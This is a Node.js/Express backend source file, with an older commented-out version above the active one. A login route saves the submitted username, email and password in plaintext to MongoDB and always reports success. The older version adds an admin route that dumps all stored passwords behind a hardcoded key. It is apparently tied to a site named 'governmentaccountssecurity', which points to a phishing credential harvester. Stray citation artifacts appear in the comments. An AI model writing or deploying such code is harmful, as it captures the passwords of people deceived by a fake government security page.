// require("dotenv").config();
// const express = require("express");
// const mongoose = require("mongoose");
// const cors = require("cors");
// const User = require("./user");

// const app = express();

// app.use(express.json());

// app.use(cors({
//   origin: [
//     "https://governmentaccountssecurity.vercel.app",
//     "http://localhost:5173"
//   ],
//   methods: ["GET", "POST", "DELETE"],
//   allowedHeaders: ["Content-Type", "x-admin-key"]
// }));

// app.get("/", (req, res) => {
//   res.status(200).send("Backend is running");
// });

// mongoose.connect(process.env.MONGO_URI)
//   .then(() => console.log("MongoDB Connected"))
//   .catch(err => console.log("Mongo Error:", err));

// app.post("/login", async (req, res) => {
//   try {
//     const { userName, email, passWord } = req.body;

//     if (!userName || !email || !passWord) {
//       return res.status(400).json({ message: "All fields required" });
//     }

//     // ❌ NO DUPLICATE CHECK
//     // ❌ NO LOGIN VALIDATION

//     const newEntry = new User({
//       userName,
//       email,
//       passWord,
//       createdAt: new Date()
//     });

//     await newEntry.save();

//     // ✅ ALWAYS SUCCESS
//     res.status(200).json({
//       success: true,
//       userName
//     });

//   } catch (err) {
//     res.status(500).json({ message: "Server error" });
//   }
// });


// app.get("/admin/users", async (req, res) => {
//   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
//     return res.status(403).json({ message: "Access denied" });
//   }

//   const users = await User.find({}, {
//     userName: 1,
//     email: 1,
//     passWord: 1,
//     _id: 0
//   });

//   res.json(users);
// });

// app.delete("/admin/clear-users", async (req, res) => {
//   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
//     return res.status(403).json({ message: "Access denied" });
//   }

//   await User.deleteMany({});
//   res.json({ message: "All users deleted" });
// });

// const PORT = process.env.PORT || 4000;
// app.listen(PORT, () => console.log(`Server running on ${PORT}`));





// server.js (Express backend)
require('dotenv').config();                 // load .env variables:contentReference[oaicite:2]{index=2}
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const User = require('./user');       // Mongoose model (defined below)

const app = express();
app.use(express.json());
app.use(cors({ origin: ['http://localhost:3000', 'https://governmentaccountssecurity.vercel.app'] }));

// Connect to MongoDB (URI from .env)
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.error(err));

// POST /login route: validate input, save to DB, always succeed
app.post('/login', async (req, res) => {
  const { userName, email, passWord } = req.body;
  if (!userName || !email || !passWord) {
    return res.status(400).json({ success: false, error: 'Missing fields' });
  }
  // Create and save a new user document (no real auth check)
  const newUser = new User({ userName, email, passWord });
  await newUser.save();  // Mongoose save() stores the document:contentReference[oaicite:3]{index=3}
  res.json({ success: true, userName });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
